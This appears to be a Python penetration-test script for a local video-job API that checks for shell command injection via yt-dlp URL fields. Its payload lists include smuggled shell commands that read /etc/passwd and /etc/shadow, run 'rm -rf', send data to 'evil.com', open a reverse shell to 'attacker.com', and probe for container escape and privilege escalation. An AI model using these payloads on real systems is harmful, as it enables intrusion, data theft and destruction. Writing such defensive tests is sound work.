#!/usr/bin/env python3
"""
🚨 CRITICAL VULNERABILITY TEST: T-001 yt-dlp Command Injection
CVSS: 9.8 (Critical)
Purpose: Test for shell command injection through video URL processing pipeline
Environment: SECURITY TESTING ONLY - Isolated environment
"""

import requests
import json
import time
import sys
from urllib.parse import quote

# Security testing environment configuration
SECURITY_TEST_BASE_URL = "http://localhost:8001"
TIMEOUT = 30

class CommandInjectionTester:
    def __init__(self):
        self.base_url = SECURITY_TEST_BASE_URL
        self.session = requests.Session()
        self.results = []
        
    def log_test(self, test_name, payload, response_status, detected_injection=False):
        """Log test results for analysis"""
        result = {
            "test": test_name,
            "payload": payload,
            "status_code": response_status,
            "injection_detected": detected_injection,
            "timestamp": time.time()
        }
        self.results.append(result)
        
        status_icon = "🚨" if detected_injection else "✅"
        print(f"{status_icon} {test_name}: {payload[:50]}... -> Status: {response_status}")
        
    def test_health_check(self):
        """Verify security test environment is accessible"""
        print("🔍 Testing security environment health...")
        try:
            response = self.session.get(f"{self.base_url}/health", timeout=TIMEOUT)
            if response.status_code == 200:
                print("✅ Security test environment is healthy")
                return True
            else:
                print(f"❌ Health check failed: {response.status_code}")
                return False
        except Exception as e:
            print(f"❌ Cannot connect to security test environment: {e}")
            return False
            
    def test_basic_shell_injection(self):
        """Test 1: Basic shell metacharacter injection"""
        print("\n🚨 TEST 1: Basic Shell Metacharacter Injection")
        
        payloads = [
            # Basic shell injection attempts
            "https://example.com/video.mp4; touch /tmp/injected_file",
            "https://example.com/video.mp4 && echo 'injection_test' > /tmp/test",
            "https://example.com/video.mp4 | cat /etc/passwd",
            "https://example.com/video.mp4 & whoami",
            
            # Command substitution attempts
            "https://example.com/video.mp4$(touch /tmp/cmd_sub)",
            "https://example.com/video.mp4`id`",
            
            # URL encoding bypass attempts
            f"https://example.com/video.mp4{quote('; rm -rf /tmp/*')}",
            f"https://example.com/video.mp4{quote('&& curl evil.com')}",
        ]
        
        for payload in payloads:
            try:
                data = {
                    "url": payload,
                    "in_ts": 0,
                    "out_ts": 10
                }
                
                response = self.session.post(
                    f"{self.base_url}/api/v1/jobs",
                    json=data,
                    timeout=TIMEOUT
                )
                
                # Check if injection was processed (dangerous if 200)
                injection_detected = response.status_code == 200
                self.log_test("Basic Shell Injection", payload, response.status_code, injection_detected)
                
                # Brief delay between tests
                time.sleep(1)
                
            except Exception as e:
                print(f"⚠️ Test error: {e}")
                
    def test_advanced_injection_techniques(self):
        """Test 2: Advanced injection techniques"""
        print("\n🚨 TEST 2: Advanced Injection Techniques")
        
        payloads = [
            # Null byte injection
            "https://example.com/video.mp4\x00; cat /etc/shadow",
            
            # Unicode bypass attempts
            "https://example.com/video.mp4\u003b touch /tmp/unicode",
            
            # Double encoding
            "https://example.com/video.mp4%253b%2520echo%2520injected",
            
            # Time-based injection detection
            "https://example.com/video.mp4; sleep 5",
            
            # Environment variable injection
            "https://example.com/video.mp4; export INJECTED=true",
            
            # File system navigation
            "https://example.com/video.mp4; cd /tmp && ls -la",
        ]
        
        for payload in payloads:
            try:
                data = {
                    "url": payload,
                    "in_ts": 0,
                    "out_ts": 10
                }
                
                start_time = time.time()
                response = self.session.post(
                    f"{self.base_url}/api/v1/jobs",
                    json=data,
                    timeout=TIMEOUT
                )
                response_time = time.time() - start_time
                
                # Check for time-based injection (sleep command)
                time_based_injection = "sleep" in payload and response_time > 4
                injection_detected = response.status_code == 200 or time_based_injection
                
                self.log_test("Advanced Injection", payload, response.status_code, injection_detected)
                time.sleep(1)
                
            except Exception as e:
                print(f"⚠️ Test error: {e}")
                
    def test_metadata_endpoint_injection(self):
        """Test 3: Metadata endpoint injection"""
        print("\n🚨 TEST 3: Metadata Endpoint Injection")
        
        payloads = [
            "https://example.com/video.mp4; curl evil.com/exfiltrate",
            "https://example.com/video.mp4 && nc -e /bin/sh attacker.com 4444",
            "https://example.com/video.mp4; python -c 'import os; os.system(\"id\")'",
        ]
        
        for payload in payloads:
            try:
                data = {"url": payload}
                
                response = self.session.post(
                    f"{self.base_url}/api/v1/metadata",
                    json=data,
                    timeout=TIMEOUT
                )
                
                injection_detected = response.status_code == 200
                self.log_test("Metadata Injection", payload, response.status_code, injection_detected)
                time.sleep(1)
                
            except Exception as e:
                print(f"⚠️ Test error: {e}")
                
    def test_container_escape_attempts(self):
        """Test 4: Container escape attempts via yt-dlp"""
        print("\n🚨 TEST 4: Container Escape Attempts")
        
        payloads = [
            # Docker escape attempts
            "https://example.com/video.mp4; mount -t proc none /proc",
            "https://example.com/video.mp4; cat /proc/1/cgroup",
            "https://example.com/video.mp4; ls -la /var/run/docker.sock",
            
            # Host file system access
            "https://example.com/video.mp4; ls -la /host",
            "https://example.com/video.mp4; cat /host/etc/passwd",
            
            # Privilege escalation attempts
            "https://example.com/video.mp4; sudo -l",
            "https://example.com/video.mp4; find / -perm -u=s -type f 2>/dev/null",
        ]
        
        for payload in payloads:
            try:
                data = {
                    "url": payload,
                    "in_ts": 0,
                    "out_ts": 10
                }
                
                response = self.session.post(
                    f"{self.base_url}/api/v1/jobs",
                    json=data,
                    timeout=TIMEOUT
                )
                
                injection_detected = response.status_code == 200
                self.log_test("Container Escape", payload, response.status_code, injection_detected)
                time.sleep(1)
                
            except Exception as e:
                print(f"⚠️ Test error: {e}")
                
    def generate_report(self):
        """Generate comprehensive test report"""
        print("\n" + "="*80)
        print("🚨 CRITICAL VULNERABILITY TEST REPORT: T-001 Command Injection")
        print("="*80)
        
        total_tests = len(self.results)
        injection_detected = sum(1 for r in self.results if r["injection_detected"])
        
        print(f"📊 SUMMARY:")
        print(f"   Total Tests: {total_tests}")
        print(f"   Potential Injections Detected: {injection_detected}")
        print(f"   Security Risk Level: {'🚨 CRITICAL' if injection_detected > 0 else '✅ LOW'}")
        
        if injection_detected > 0:
            print(f"\n⚠️ CRITICAL FINDING:")
            print(f"   {injection_detected} out of {total_tests} tests suggest command injection vulnerability")
            print(f"   This confirms T-001 (CVSS 9.8) vulnerability exists")
            print(f"   IMMEDIATE ACTION REQUIRED: yt-dlp input sanitization")
            
        print(f"\n📝 DETAILED RESULTS:")
        for result in self.results:
            status = "🚨 VULNERABLE" if result["injection_detected"] else "✅ BLOCKED"
            print(f"   {status} | {result['test']} | Status: {result['status_code']}")
            
        # Save detailed results
        with open("logs-security-test/t001_command_injection_results.json", "w") as f:
            json.dump(self.results, f, indent=2)
            
        print(f"\n💾 Detailed results saved to: logs-security-test/t001_command_injection_results.json")
        
    def run_all_tests(self):
        """Execute complete command injection test suite"""
        print("🚨 STARTING CRITICAL VULNERABILITY TEST: T-001 Command Injection")
        print("Environment: Isolated Security Testing (localhost:8001)")
        print("="*80)
        
        if not self.test_health_check():
            print("❌ Cannot proceed - security test environment not accessible")
            return False
            
        # Execute all test categories
        self.test_basic_shell_injection()
        self.test_advanced_injection_techniques() 
        self.test_metadata_endpoint_injection()
        self.test_container_escape_attempts()
        
        # Generate comprehensive report
        self.generate_report()
        
        return True

if __name__ == "__main__":
    print("🚨 T-001 Command Injection Vulnerability Tester")
    print("SECURITY TESTING ENVIRONMENT ONLY")
    print("Do NOT run against production systems")
    print()
    
    # Confirm this is security testing
    if "8001" not in SECURITY_TEST_BASE_URL:
        print("❌ ERROR: Not configured for security testing environment")
        sys.exit(1)
        
    tester = CommandInjectionTester()
    success = tester.run_all_tests()
    
    if success:
        print("\n✅ T-001 Command Injection Testing Complete")
        print("📋 Next: Review results and proceed to T-002 Container Escape Testing")
    else:
        print("\n❌ T-001 Testing Failed - Environment Issues") 